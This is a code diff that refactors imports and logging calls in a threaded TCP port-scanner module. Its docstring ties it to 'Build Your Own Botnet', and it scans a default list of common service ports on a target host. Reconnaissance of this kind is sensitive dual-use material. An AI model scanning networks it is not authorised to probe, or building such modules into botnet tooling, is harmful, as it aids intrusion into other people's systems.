@@ -1,4 +1,4 @@
-    #!/usr/bin/python
+#!/usr/bin/python
 # -*- coding: utf-8 -*-
 'Port Scanner (Build Your Own Botnet)'
 
@@ -14,7 +14,7 @@ else:
 import subprocess
 
 # utilities
-import util
+from util import *
 
 # globals
 packages = []
@@ -660,11 +660,11 @@ def _ping(host):
         else:
             return True
     except Exception as e:
-        util.log(str(e))
+        log(str(e))
         return False
 
 
-@util.threaded
+@threaded
 def _threader():
     while True:
         global tasks
@@ -707,7 +707,7 @@ def _scan(target):
     except (socket.error, socket.timeout):
         pass
     except Exception as e:
-        util.log("{} error: {}".format(_scan.__name__, str(e)))
+        log("{} error: {}".format(_scan.__name__, str(e)))
 
 
 def run(target='192.168.1.1', ports=[21,22,23,25,80,110,111,135,139,443,445,554,993,995,1433,1434,3306,3389,8000,8008,8080,8888]):
@@ -725,7 +725,7 @@ def run(target='192.168.1.1', ports=[21,22,23,25,80,110,111,135,139,443,445,554,
     global tasks
     global threads
     global results
-    if not util.ipv4(target):
+    if not ipv4(target):
         raise ValueError("target is not a valid IPv4 address")
     if _ping(target):
         for port in ports:
@@ -737,3 +737,4 @@ def run(target='192.168.1.1', ports=[21,22,23,25,80,110,111,135,139,443,445,554,
         return json.dumps(results[target])
     else:
         return "Target offline"
+
